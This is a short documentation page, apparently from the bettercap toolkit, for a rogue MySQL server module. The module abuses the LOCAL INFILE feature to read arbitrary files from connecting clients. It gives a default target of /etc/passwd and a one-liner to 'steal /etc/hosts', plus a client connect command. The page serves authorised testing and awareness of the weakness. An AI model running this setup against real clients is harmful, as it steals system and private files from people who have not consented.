---
title: mysql.server (rogue)
description: A rogue MySQL server that can be used to exploit LOCAL INFILE and read arbitrary files from the client.
---

A rogue MySQL server that can be used to exploit [LOCAL INFILE and read arbitrary files](/modules/ethernet/spoofers/introduction/) from the client.

## Commands

### `mysql.server on`

Start mysql server.

### `mysql.server off`

Stop mysql server.

## Parameters

| Parameter              | Default               | Description                                                                      |
| ---------------------- | --------------------- | -------------------------------------------------------------------------------- |
| `mysql.server.address` | `<interface address>` | Address to bind the mysql server to.                                             |
| `mysql.server.infile`  | `/etc/passwd`         | File you want to read. UNC paths are also supported.                             |
| `mysql.server.outfile` |                       | If filled, the INFILE buffer will be saved to this path instead of being logged. |
| `mysql.server.port`    | `3306`                | Port to bind the mysql server to.                                                |

## Examples

One liner to start the server and steal `/etc/hosts` from clients connecting to your Rogue MySQL server

```bash
sudo bettercap -eval "set mysql.server.infile /etc/hosts; mysql.server on"
```

Now connect to your MySQL server and observe the file output on the Bettercap terminal

```bash
mysql -u root -h 192.168.1.123 -pasdsasad --enable-local-infile
```
